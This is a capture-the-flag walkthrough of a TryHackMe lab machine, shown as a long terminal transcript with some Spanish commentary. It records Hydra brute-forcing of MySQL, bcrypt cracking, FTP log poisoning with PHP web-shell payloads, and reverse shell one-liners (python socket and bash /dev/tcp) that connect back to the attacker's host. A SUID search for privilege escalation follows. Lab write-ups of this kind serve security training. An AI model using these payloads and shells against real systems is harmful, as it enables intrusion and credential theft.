---
You as well, Brutus?
---

![](https://i.postimg.cc/5NFMNX0n/Webp-net-resizeimage-1.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/8dedd4f34a2aff294744a0572773eb5d.png)


### What is the root and user flag?

 Start Machine

You won't be able to just brute your way into this one, or will you?  

Answer the questions below

```
┌──(kali㉿kali)-[~/nappy]
└─$ rustscan -a 10.10.217.25 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.217.25:22
Open 10.10.217.25:21
Open 10.10.217.25:80
Open 10.10.217.25:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 16:34 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:34
Completed Parallel DNS resolution of 1 host. at 16:34, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:34
Scanning 10.10.217.25 [4 ports]
Discovered open port 22/tcp on 10.10.217.25
Discovered open port 21/tcp on 10.10.217.25
Discovered open port 3306/tcp on 10.10.217.25
Discovered open port 80/tcp on 10.10.217.25
Completed Connect Scan at 16:34, 0.20s elapsed (4 total ports)
Initiating Service scan at 16:34
Scanning 4 services on 10.10.217.25
Completed Service scan at 16:34, 6.56s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.217.25.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 6.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 4.73s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Nmap scan report for 10.10.217.25
Host is up, received user-set (0.20s latency).
Scanned at 2023-01-12 16:34:09 EST for 17s

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.3
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c7721464243c1101e950730fa48c33d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXqzNUndANboqhGwqmfhneakMW3jjexZbHnw2pVw+ljoqMzxp2+CT06bhnRxtBRMeKXzX4E4cDOOKx1gHrkoVZgOjoz8X2GxfxH+KxGcmQPxODfgPpH18vxFvYaZpRAImr2jCa7TgfIyOZjtFb2rQDjAfvO+RK6egqMCqU+YuGdEeEvMBsNIiGymZl2pWzvk1Xenh7bMHl9YOiT41AhyFfvAQ4nfFLjk068S3OQKZ6d2jmFDr5YYd5Q9pLcoPGU9+yUCbBzrFCMdaRyvbYcbJnM8K65wKDhnrD5wAU6fAWyxRT6PaPFBhJp+fqMXZJAQUEWZHjAVOhHd+ZHgU6nXJ+u9GfXXj5ceZ7JJGclZzVKb7JHX93U1Ofuq+N+Zl3cdoc9Vi56N6ZamxaTTALZRM3UmrjqWfbDtyKZcnqQekb/40Pb4VzCzpvkGBW5++LXiMzQ/Ri7wcyfS0leBDMV0WdHR6DRiAVlii3M9YASX498tENGCBhe7yzGNFmPM3+rCM=
|   256 0e0e07a53c3209ed921b6884f12fcce1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLe3OgttRgIkQikz1ER+UuSSBb80MH3A+1Vmd+VNBKZhl9EqUBT4K+YpIA7NJdau/V1NzhuZdvVAUWd03rb43wk=
|   256 32f1d2ececc1ba2218ec02f4bc74c7af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGj5zUvI22cV4JdUIj3IFx/3PVHqujyIkwU9MjP3gpay
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
3306/tcp open  mysql   syn-ack MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 18
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, IgnoreSigpipes, InteractiveClient, ODBCClient, ConnectWithDatabase, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: T0~\x1Dt\x1B#1WZL\x1F\x0E 'S\x02\x16"i
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.26_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-19T04:00:09
| Not valid after:  2031-10-17T04:00:09
| MD5:   5441cf59375b5402352d4df1dab3f945
| SHA-1: de74633f3958dd200a40e5b4ffa9cae862d89d46
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjI2X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMTAxOTA0MDAwOVoXDTMxMTAxNzA0MDAwOVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4yNl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDceHCeokIvf/5tiDXOhmUK
| HjWxbf+vHbhSEV0kg9J5CNyqL9JRLL+vLStv5KXyw4giERZmQZR7UM3VLu/jw1vg
| K3CMB7CWqaCTJclhqHgJXlH2OU0LGlkgjvoUjV2pnQKGsCEDVl2Q4QiXKzSMai4d
| ISz1QR9kQsV8bOEw7a46Ece9hPH4ESSUF7ZuTgnbLzBhxYlVa5HYQ2Zt7Z2c6ZGR
| fyJTMtovZzmxN0KWaiOJzCBAT5/ZaTiVR2mK0KpzoxJ1sut5Trw98Uh2iBtC/rXt
| z6+HiJjncW1phZNaXWgYrkp5GrGz39LPmK+XmBNlraokiLDubJkKrgvE8vILE9rd
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAKcxAdpb
| Z6ahf4CWhSPH4maAHWqYytghjPjG1Tlk6Lvwu3wTJUqItsmphvRIXvu1fME4TRZd
| ZG9ZM8BARM5ZZYCRHmhfGA5JBaKpAvfjhPNVssvVjSVI4cpiMTVrPikva22Qzxq7
| 33oVAFsfYlSiFqlRHqdNwAv5TSn0N85xU/En6DmUowaQzwTcPBrns1EC1lrDMBXU
| WY2rYfQiC0EkZVhkQuNGkXyUj/e89mwp8RVVJFkmjZ6NbuGCDCenG+A6/kDWj9ps
| mnDukjklQJKq9p6iIhrV69ejm3OHL5hfPRahBIM8AYAtljW2LQ67elYijyCde58Z
| AcodcjpmQ8egD1w=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:34
Completed NSE at 16:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds

┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.217.25
Connected to 10.10.217.25.
220 (vsFTPd 3.0.3)
Name (10.10.217.25:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.

https://dev.mysql.com/doc/refman/8.0/en/default-privileges.html

┌──(kali㉿kali)-[~/nappy]
└─$ nmap --script mysql-enum -sV -p 3306 -Pn 10.10.217.25 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 17:07 EST
Nmap scan report for 10.10.217.25
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 2 seconds, average tps: 5.0

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.64 seconds

┌──(kali㉿kali)-[~/nappy]
└─$ mysql -h 10.10.183.215 -u root -p   
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'ip-10-8-19-103.eu-west-1.compute.internal' (using password: YES)

┌──(kali㉿kali)-[~/nappy]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.183.215 mysql -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-13 11:09:37
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.10.183.215:3306/
[ATTEMPT] target 10.10.183.215 - login "root" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "iloveyou" - 5 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "princess" - 6 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "1234567" - 7 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.183.215 - login "root" - pass "rockyou" - 8 of 14344399 [child 2] (0/0)
[3306][mysql] host: 10.10.183.215   login: root   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-13 11:09:57


┌──(kali㉿kali)-[~/nappy]
└─$ mysql -h 10.10.183.215 -u root -p           
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.195 sec)

MySQL [(none)]> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [website]> show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.194 sec)

MySQL [website]> describe users;
+------------+--------------+------+-----+-------------------+-------------------+
| Field      | Type         | Null | Key | Default           | Extra             |
+------------+--------------+------+-----+-------------------+-------------------+
| id         | int          | NO   | PRI | NULL              | auto_increment    |
| username   | varchar(50)  | NO   | UNI | NULL              |                   |
| password   | varchar(255) | NO   |     | NULL              |                   |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+------------+--------------+------+-----+-------------------+-------------------+
4 rows in set (0.498 sec)

MySQL [website]> select usernme, password from users;
ERROR 1054 (42S22): Unknown column 'usernme' in 'field list'
MySQL [website]> select username, password from users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we |
+----------+--------------------------------------------------------------+
1 row in set (0.326 sec)

or

MySQL [website]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.412 sec)


https://hashcat.net/wiki/doku.php?id=example_hashes ($2*$ bcrypt --> 3200)

┌──(kali㉿kali)-[~/nappy]
└─$ cat hash_brute            
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we


┌──(kali㉿kali)-[~/nappy]
└─$ hashcat -m 3200 -a 0 hash_brute /usr/share/wordlists/rockyou.txt -o hash_brute_cracked
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1240/2545 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Fri Jan 13 11:18:41 2023 (4 secs)
Time.Estimated...: Fri Jan 13 11:18:45 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        9 H/s (5.53ms) @ Accel:4 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 32/14344385 (0.00%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 16/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 654321 -> butterfly
Hardware.Mon.#1..: Util: 72%

Started: Fri Jan 13 11:16:09 2023
Stopped: Fri Jan 13 11:18:49 2023


┌──(kali㉿kali)-[~/nappy]
└─$ hashcat -m 3200 -a 0 hash_brute --show                                                
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger


┌──(kali㉿kali)-[~/nappy]
└─$ cat hash_brute_cracked 
$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger

or using john

┌──(kali㉿kali)-[~/nappy]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_brute
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tigger           (?)     
1g 0:00:00:00 DONE (2023-01-13 11:20) 1.041g/s 37.50p/s 37.50c/s 37.50C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

Adrian:tigger

login

view-source:http://10.10.183.215/welcome.php

<h1 class="my-5">Welcome back Adrian, Your log file is ready for viewing.</h1>
        <br> 
    <form action="" method="post">
        <input type="submit" name="log" value="Log">	
    </form>
    <br>
    <p> 
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>

┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed

Fri Jan 13 16:22:28 2023 [pid 1617] CONNECT: Client "::ffff:10.8.19.103" Fri Jan 13 16:22:38 2023 [pid 1616] [anonymous] FAIL LOGIN: Client "::ffff:10.8.19.103" 

┌──(kali㉿kali)-[~/nappy]
└─$ nc -vn 10.10.183.215 21
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.183.215:21.
220 (vsFTPd 3.0.3)
whoami
530 Please login with USER and PASS.


Ftp log poisoning
https://secnhack.in/ftp-log-poisoning-through-lfi/

payloads : 

'<?php system($_GET['x']); ?>'
'<?php system($_REQUEST['x']); ?>'
'<?php echo system($_REQUEST['x']); ?>'
'<?php echo shell_exec($_GET['x']); ?>'

Estas son líneas de código PHP que permiten ejecutar comandos en el sistema operativo del servidor donde se ejecuta el código. La diferencia entre ellas es la forma en que se recibe la entrada del usuario.

-   En la primera línea, el comando se recibe a través de la variable $_GET['x'].
-   En la segunda línea, el comando se recibe a través de la variable $_REQUEST['x'].
-   En la tercera línea, el comando se recibe a través de la variable $_REQUEST['x'] y su salida se muestra en la página web.
-   En la cuarta línea, el comando se recibe a través de la variable $_GET['x'] y su salida se muestra en la página web usando la función shell_exec().

Sin embargo, estas líneas de código son altamente peligrosas ya que permiten a un atacante ejecutar cualquier comando en el sistema operativo del servidor, incluyendo comandos maliciosos. Es importante asegurarse de validar y sanitizar cualquier entrada del usuario antes de utilizarlo en una función como system() o shell_exec().


┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): '<?php system($_GET['x']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

http://10.10.183.215/welcome.php?x=id

Fri Jan 13 16:47:24 2023 [pid 2662] ['uid=33(www-data) gid=33(www-data) groups=33(www-data)
'] FAIL LOGIN: Client "::ffff:10.8.19.103"

revshell

https://www.revshells.com/

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:51494.
www-data@brute:/var/www/html$ exit
exit
exit


or

bash -c 'bash -i >& /dev/tcp/10.8.19.103/4444 0>&1'

bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E8%2E19%2E103%2F4444%200%3E%261%27

┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:37024.
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ 

or using burp

┌──(kali㉿kali)-[~/nappy]
└─$ ftp 10.10.183.215
Connected to 10.10.183.215.
220 (vsFTPd 3.0.3)
Name (10.10.183.215:kali): '<?php echo system($_REQUEST['x']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.

using request with burp

---
POST /welcome.php HTTP/1.1
Host: 10.10.183.215
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://10.10.183.215
Connection: close
Referer: http://10.10.183.215/welcome.php
Cookie: PHPSESSID=627ddsmmq6t3vkk494opc7qc56
Upgrade-Insecure-Requests: 1
log=Log&x=whoami
---
Fri Jan 13 17:31:51 2023 [pid 6549] CONNECT: Client "::ffff:10.8.19.103"
Fri Jan 13 17:31:56 2023 [pid 6548] ['www-data
www-data'] FAIL LOGIN: Client "::ffff:10.8.19.103"

to encode just press CTRL + U

bash+-c+'bash+-i+>%26+/dev/tcp/10.8.19.103/4444+0>%261'

log=Log&x=bash+-c+'bash+-i+>%26+/dev/tcp/10.8.19.103/4444+0>%261'

and then send 

┌──(kali㉿kali)-[~/nappy]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.183.215.
Ncat: Connection from 10.10.183.215:37028.
bash: cannot set terminal process group (766): Inappropriate ioctl for device
bash: no job control in this shell
www-data@brute:/var/www/html$ whoami
whoami
www-data

stabilizing shell

www-data@brute:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@brute:/var/www/html$ 
zsh: suspended  rlwrap nc -lnvp 4444                                                                                                                                          
┌──(kali㉿kali)-[~/nappy]
└─$ stty raw -echo; fg      
[1]  + continued  rlwrap nc -lnvp 4444
www-data@brute:/var/www/html$ export TERM=xterm-256color
TERM=xterm-256color

Este es un comando de terminal utilizado para cambiar la configuración de la terminal.

-   "stty raw" desactiva la interpretación de caracteres especiales por la terminal, lo que permite ingresar caracteres como Ctrl o Alt sin que la terminal los interprete como comandos.
-   "-echo" desactiva el eco de los caracteres ingresados, lo que significa que los caracteres no se imprimen en pantalla mientras se ingresan.

"fg" es un comando utilizado para traer un trabajo en segundo plano al primer plano.

Este es un comando de la línea de comandos que se utiliza para establecer una variable de entorno llamada TERM. Esta variable es utilizada por el sistema operativo para determinar qué tipo de terminal está siendo utilizado.

El valor especificado en el comando ("xterm") indica que se está utilizando una terminal xterm. Esta es una de las terminales más comunes en sistemas Unix y Linux, y es compatible con una amplia variedad de características y funciones.

Existen varios tipos de terminales (vt100, xterm, ansi, etc) y cada uno tiene su propia configuración y características. Al establecer TERM = xterm, se está diciendo al sistema operativo que se está utilizando una terminal xterm, lo que permite al sistema operativo utilizar las características y configuraciones específicas de xterm.

This command is similar to the previous one. It sets the TERM environment variable to "xterm-256color", indicating that the terminal being used is an xterm terminal with support for 256 colors.

256 color terminal allows the terminal to display more colors than the traditional 8-color terminal, thus providing more visual options and better color representation. This feature is useful in applications such as text editors and terminal-based games that require advanced color support.

It's also important to note that some applications may require the TERM variable to be set to a specific value in order to function properly. Setting the TERM variable to the correct value ensures that these applications will work as expected.


www-data@brute:/var/www/html$ ls
ls
config.php  index.php  logout.php  welcome.php
www-data@brute:/var/www/html$ cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', 'P@sswr0d789!');
define('DB_NAME', 'website');
 
/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($mysqli === false){
    die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>

www-data@brute:/var/www/html$ find / -perm -4000 2>/dev/null | xargs ls -lah
find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2253/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2253/bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2253/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2253/bin/umount
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2253/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /snap/core18/2253/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /snap/core18/2253/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /snap/core18/2253/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /snap/core18/2253/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2253/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2253/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Aug 11  2021 /snap/core18/2253/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             43K Sep 16  2020 /snap/core18/2344/bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /snap/core18/2344/bin/ping
-rwsr-xr-x 1 root   root             44K Jan 25  2022 /snap/core18/2344/bin/su
-rwsr-xr-x 1 root   root             27K Sep 16  2020 /snap/core18/2344/bin/umount
-rwsr-xr-x 1 root   root             75K Jan 25  2022 /snap/core18/2344/usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Jan 25  2022 /snap/core18/2344/usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Jan 25  2022 /snap/core18/2344/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             40K Jan 25  2022 /snap/core18/2344/usr/bin/newgrp
-rwsr-xr-x 1 root   root             59K Jan 25  2022 /snap/core18/2344/usr/bin/passwd
-rwsr-xr-x 1 root   root            146K Jan 19  2021 /snap/core18/2344/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 11  2020 /snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            427K Mar  3  2020 /snap/core18/2344/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1242/usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1242/usr/bin/chsh
-rwsr-xr-x 1 root   root             87K Jul 14  2021 /snap/core20/1242/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             55K Jul 21  2020 /snap/core20/1242/usr/bin/mount
-rwsr-xr-x 1 root   root             44K Jul 14  2021 /snap/core20/1242/usr/bin/newgrp
-rwsr-xr-x 1 root   root             67K Jul 14  2021 /snap/core20/1242/usr/bin/passwd
-rwsr-xr-x 1 root   root             67K Jul 21  2020 /snap/core20/1242/usr/bin/su
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /snap/core20/1242/usr/bin/sudo
-rwsr-xr-x 1 root   root             39K Jul 21  2020 /snap/core20/1242/usr/bin/umount
-rwsr-xr-- 1 root   systemd-resolve  51K Jun 11  2020 /snap/core20/1242/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            463K Jul 23  2021 /snap/core20/1242/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             84K Jul 14  2021 /snap/core20/1405/usr/bin/chfn
-rwsr-xr-x 1 root   root             52K Jul 14  2021 /snap/core20/1405/usr/bin/chsh
